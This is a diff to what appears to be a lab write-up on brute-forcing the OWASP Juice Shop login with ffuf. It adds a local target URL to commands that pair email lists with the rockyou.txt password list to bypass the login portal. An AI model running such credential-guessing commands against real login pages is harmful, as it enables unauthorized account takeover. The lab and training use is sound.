@@ -74,7 +74,7 @@ Multi-wordlist operation mode. (default: clusterbomb)
 ## Example
 
 ```bash
-ffuf -request request.txt --request-proto https -mode clusterbomb -w passwords.txt:FUZZPASSWD -w email-list.txt:FUZZEMAIL
+ffuf -request request.txt --request-proto https -mode clusterbomb -w passwords.txt:FUZZPASSWD -w email-list.txt:FUZZEMAIL -u http://127.0.0.1:3000
 ```
 
 With that command we are fuzzing the request testing each email and password with the payloads to bypass the log in portal.
@@ -107,7 +107,7 @@ It is necessary add the recipe "Split" to separate each payload. In the field "S
 - FUZZPASSWD will be the classic "rockyou.txt" wordlist.
 
 ```bash
-> ffuf -request request.txt --request-proto http -mode pitchfork -w /usr/share/wordlists/rockyou.txt:FUZZPASSWD -w /home/hackermater/Labs/Juice\ Shop/email-list.txt:FUZZEMAIL -mc 200
+> ffuf -request request.txt --request-proto http -mode pitchfork -w /usr/share/wordlists/rockyou.txt:FUZZPASSWD -w /home/hackermater/Labs/Juice\ Shop/email-list.txt:FUZZEMAIL -mc 200 -u http://127.0.0.1:3000
          ____    ____             ____
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
